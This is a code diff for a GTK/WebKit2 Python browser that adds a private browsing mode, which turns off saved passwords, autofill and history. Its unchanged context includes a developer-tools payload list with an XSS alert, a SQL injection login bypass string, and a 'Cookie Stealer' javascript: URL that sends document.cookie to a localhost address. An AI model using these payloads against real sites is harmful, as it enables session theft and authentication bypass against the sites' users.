@@ -99,6 +99,7 @@ class ZeroDevBrowser(Gtk.Window):
         self.bm_path = os.path.join(os.path.expanduser("~"), ".zero_bookmarks.json")
         self.pw_path = os.path.join(os.path.expanduser("~"), ".zero_passwords.json")
         self.passwords = {}
+        self.is_private = False
         
         self.main_vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
         self.add(self.main_vbox)
@@ -175,6 +176,12 @@ class ZeroDevBrowser(Gtk.Window):
         self.btn_devtools.connect("toggled", self.on_devtools_toggled)
         self.header.pack_end(self.btn_devtools)
 
+        self.btn_private = Gtk.ToggleButton()
+        self.btn_private.add(Gtk.Image.new_from_icon_name("security-high-symbolic", Gtk.IconSize.MENU))
+        self.btn_private.set_tooltip_text("Toggle Private Browsing Mode")
+        self.btn_private.connect("toggled", self.on_private_toggled)
+        self.header.pack_end(self.btn_private)
+
         self.btn_newtab = Gtk.Button()
         self.btn_newtab.add(Gtk.Image.new_from_icon_name("tab-new-symbolic", Gtk.IconSize.MENU))
         self.btn_newtab.set_tooltip_text("New Tab")
@@ -215,6 +222,16 @@ class ZeroDevBrowser(Gtk.Window):
         
         self.adblock_enabled = True
         self.new_tab("zero://start")
+
+    def on_private_toggled(self, btn):
+        self.is_private = btn.get_active()
+        ctx = self.header.get_style_context()
+        if self.is_private:
+            ctx.add_class("private-header")
+            self.header.set_subtitle("Private Mode Active")
+        else:
+            ctx.remove_class("private-header")
+            self.header.set_subtitle("")
 
     # ================= POPOVERS =================
     def build_downloads_popover(self):
@@ -291,6 +308,7 @@ class ZeroDevBrowser(Gtk.Window):
         dialog.destroy()
 
     def on_password_intercepted(self, manager, js_result):
+        if self.is_private: return
         try:
             data = json.loads(js_result.get_js_value().to_string())
             domain = data.get("url")
@@ -418,7 +436,6 @@ class ZeroDevBrowser(Gtk.Window):
         self.dev_stack.add_titled(self.build_js_console(), "js", "JS Console"); self.dev_stack.add_titled(self.build_network_panel(), "network", "Network"); self.dev_stack.add_titled(self.build_cookie_explorer(), "cookies", "Cookies"); self.dev_stack.add_titled(self.build_storage_explorer(), "storage", "Storage"); self.dev_stack.add_titled(self.build_source_viewer(), "source", "DOM Source"); self.dev_stack.add_titled(self.build_css_panel(), "css", "CSS Inject"); self.dev_stack.add_titled(self.build_terminal_emulator(), "term", "Python Term")
         self.dev_stack.connect("notify::visible-child", self.on_dev_stack_changed)
         
-        # Add Exploits Payload tab to DevTools instead of sidebar
         plist = Gtk.ListBox()
         for title, p in [("XSS Alert", "javascript:alert(1)"), ("SQLi Bypass", "' OR '1'='1"), ("Cookie Stealer", "javascript:fetch('http://localhost/?c='+document.cookie)")]:
             row = Gtk.ListBoxRow(); v = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); lt = Gtk.Label(label=title); lt.set_halign(Gtk.Align.START); lt.get_style_context().add_class("bold-label"); lp = Gtk.Label(label=p); lp.set_halign(Gtk.Align.START); lp.set_line_wrap(True); v.pack_start(lt, False, False, 2); v.pack_start(lp, False, False, 2); row.add(v); plist.add(row)
@@ -615,7 +632,8 @@ class ZeroDevBrowser(Gtk.Window):
             if self.current_webview == w: self.url_bar.set_text(uri)
             if uri != "zero://start" and not uri.startswith("about:"): 
                 title = w.get_title() or "Untitled"
-                self.add_to_popover(self.history_list, title, uri, "text-html-symbolic")
+                if not self.is_private:
+                    self.add_to_popover(self.history_list, title, uri, "text-html-symbolic")
             
         def on_title(w, p):
             title = w.get_title() or "Untitled"
@@ -625,7 +643,7 @@ class ZeroDevBrowser(Gtk.Window):
         def on_load(w, ev):
             if ev == WebKit2.LoadEvent.FINISHED:
                 u = w.get_uri()
-                if u:
+                if u and not self.is_private:
                     domain = urllib.parse.urlparse(u).hostname
                     if domain in self.passwords:
                         cred = self.passwords[domain]
@@ -660,6 +678,7 @@ class ZeroDevBrowser(Gtk.Window):
             .vertical-tabs-list row { padding: 4px; border-radius: 6px; margin: 2px 6px; transition: all 0.2s; }
             .vertical-tabs-list row:hover { background: rgba(255,255,255,0.05); }
             .vertical-tabs-list row:selected { background: rgba(77,144,254,0.15); border: 1px solid rgba(77,144,254,0.3); }
+            .private-header { background: #4a148c; border-bottom: 2px solid #8e24aa; }
         '''
         provider = Gtk.CssProvider(); provider.load_from_data(css)
         Gtk.StyleContext.add_provider_for_screen(Gdk.Screen.get_default(), provider, Gtk.STYLE_PROVIDER_PRIORITY_APPLICATION)
